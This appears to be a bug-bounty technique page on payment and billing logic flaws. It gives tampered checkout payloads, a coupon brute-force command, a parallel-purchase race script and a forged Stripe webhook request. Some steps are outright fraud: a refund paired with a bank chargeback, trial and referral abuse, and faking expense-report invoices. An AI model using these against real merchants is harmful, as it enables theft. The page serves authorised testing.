---
id: "payment-billing-logic"
title: "Payment & Billing Logic Flaws"
type: "technique"
category: "web-application"
subcategory: "business-logic"
tags: ["payment", "billing", "pricing", "stripe", "subscription", "refund", "coupon", "race-condition", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["business-logic-flaws", "race-conditions", "idor-bola"]
difficulty: "advanced"
updated: "2026-04-14"
---

# Payment & Billing Logic Flaws

## Why Payment Bugs Pay Top Dollar
Payment logic flaws are consistently $10k–$100k+ because they have direct financial impact. Every SaaS, e-commerce, and fintech app has payment flows — and most have logic gaps.

## Attack Categories

### 1. Price Manipulation
```
# Client-side price in hidden form fields or API calls
# Intercept and modify:

POST /api/checkout
{"item_id": "premium_plan", "price": 9900}
# Change to:
{"item_id": "premium_plan", "price": 0}
{"item_id": "premium_plan", "price": 1}
{"item_id": "premium_plan", "price": -100}  # Negative = credit?

# Also test:
# - Quantity: 0, -1, 99999999
# - Currency: Change USD to a weaker currency
# - Discount: 100%, 101%, 999%
# - Tax: Negative tax value
```

### 2. Coupon/Promo Code Abuse
```
# Race condition: Apply same coupon in parallel
# → Multiple discounts stacked

# Coupon code brute force (if short alphanumeric):
ffuf -u https://target.com/api/apply-coupon \
  -X POST -d '{"code":"FUZZ"}' \
  -w /path/to/coupon-wordlist.txt

# Test:
# - Apply coupon after payment is initiated but before charge
# - Apply expired coupons (check if expiry is client-side)
# - Stack multiple different coupons
# - Use referral code + coupon together
# - Apply coupon to already-discounted items
# - Transfer coupon between accounts
# - Use coupon on plan upgrade (not just new purchase)
```

### 3. Subscription Manipulation
```
# Downgrade but keep features:
# 1. Subscribe to premium plan
# 2. Downgrade to free plan
# 3. Check if premium features are still accessible
# 4. Often: features are checked at grant time, not access time

# Trial abuse:
# - Create account with trial
# - Cancel before trial ends
# - Re-create with same email after "cooling period"
# - Use email aliases (user+1@gmail.com)
# - Change email during trial to extend

# Plan confusion:
# - Subscribe to Plan A, then change plan_id to Plan B in upgrade request
# - Modify subscription API to set quantity=0 but keep active
# - Change billing_cycle from monthly to yearly at monthly price
```

### 4. Refund Logic Flaws
```
# Double refund:
# 1. Request refund through app
# 2. Simultaneously request chargeback through bank
# 3. Receive money twice

# Partial refund abuse:
# 1. Buy 10 items
# 2. Request refund for 5
# 3. Modify refund request to refund 10 while keeping items

# Refund to different payment method:
# 1. Purchase with Card A
# 2. Add Card B to account
# 3. Request refund, intercept to change refund destination to Card B
# 4. Also do chargeback on Card A

# Gift card → refund → cash:
# 1. Buy item with gift card
# 2. Refund to original payment → some apps refund to bank instead
```

### 5. Currency Confusion
```
# If the app supports multiple currencies:
# 1. Set price display to weak currency (e.g., IDR, VND)
# 2. Intercept payment, change currency code to USD
# 3. Pay $1 worth of IDR for a $100 item

# Also:
# - Switch currency mid-checkout
# - Use currency not officially supported by the app
# - Exploit rounding differences between currencies
# - Pay in crypto, get refund in fiat (or vice versa)
```

### 6. Race Conditions in Payments
```python
# Classic: Spend the same balance twice
import asyncio
import httpx

async def race_payment():
    async with httpx.AsyncClient() as client:
        headers = {"Cookie": "session=TOKEN"}
        
        # Fire 20 parallel purchase requests
        tasks = [
            client.post(
                "https://target.com/api/purchase",
                json={"item_id": "expensive_item", "quantity": 1},
                headers=headers
            )
            for _ in range(20)
        ]
        results = await asyncio.gather(*tasks)
        
        successes = [r for r in results if r.status_code == 200]
        print(f"Successful purchases: {len(successes)}")
        # If > 1 success with insufficient balance → vulnerability

asyncio.run(race_payment())
```

### 7. Webhook/Callback Manipulation
```
# Stripe/PayPal webhook verification bypass:
# 1. Find the webhook endpoint (usually /api/webhooks/stripe)
# 2. Send a fake "payment_intent.succeeded" event
# 3. Check if signature verification is enforced

# Test:
curl -X POST https://target.com/api/webhooks/stripe \
  -H "Content-Type: application/json" \
  -d '{
    "type": "payment_intent.succeeded",
    "data": {
      "object": {
        "id": "pi_fake123",
        "amount": 0,
        "currency": "usd",
        "metadata": {"user_id": "YOUR_USER_ID", "plan": "enterprise"}
      }
    }
  }'

# Also check:
# - Is the webhook endpoint authenticated?
# - Can you replay a legitimate webhook?
# - Can you modify the amount in the webhook payload?
# - Does the app verify the payment amount matches the order?
```

### 8. Gift Card / Credits System
```
# Negative transfer:
# Transfer -$50 from your account to target → you gain $50

# Self-referral:
# Create account → generate referral → create second account with referral
# Both accounts get credit

# Gift card generation:
# If gift cards have predictable patterns (sequential, weak PRNG)
# Enumerate valid cards: GIFT-0001, GIFT-0002, etc.

# Balance check IDOR:
# GET /api/giftcard/CARD_ID/balance
# Enumerate other users' gift card balances and codes
```

### 9. Upgrade/Downgrade Timing
```
# 1. Start free trial
# 2. Immediately upgrade to enterprise (trial period should apply)
# 3. Cancel before trial ends
# 4. Check: do you keep enterprise features during "trial"?

# Plan switching race:
# 1. On basic plan, initiate upgrade to premium
# 2. Before payment processes, switch to enterprise
# 3. Pay premium price, get enterprise features

# Billing date manipulation:
# 1. Subscribe on the 31st of a month
# 2. February has 28 days → billing skipped?
# 3. Some systems miscalculate billing cycles around month boundaries
```

### 10. Invoice/Receipt Manipulation
```
# IDOR on invoices:
# GET /api/invoices/12345 → Your invoice
# GET /api/invoices/12344 → Someone else's invoice (PII leak)

# Invoice amount modification:
# If invoices are generated client-side or via a template
# Modify the amount for expense report fraud

# Tax exemption bypass:
# Add tax_exempt=true to checkout request
# Change country/state to tax-free jurisdiction
```

## Deep Dig Prompts
```
Given this payment flow [describe steps]:
1. Map every API call from cart → checkout → payment → confirmation
2. Identify which values are trusted from the client (price, quantity, currency, discount)
3. Test race conditions on balance deduction and coupon application
4. Check webhook signature verification
5. Test subscription state after downgrade/cancellation
6. Look for IDOR on invoices, receipts, and payment methods
```

## Tools
- Burp Suite (intercept & modify payment requests)
- Turbo Intruder (race conditions on payments)
- Custom scripts for webhook spoofing
- mitmproxy for mobile payment flow interception

## Key Signals
- Client-side price calculation (JS calculates total)
- `price`, `amount`, `total`, `discount` in request body
- Sequential invoice/order IDs
- Webhook endpoints in robots.txt or JS files
- Multiple currency support
- Free trial offering
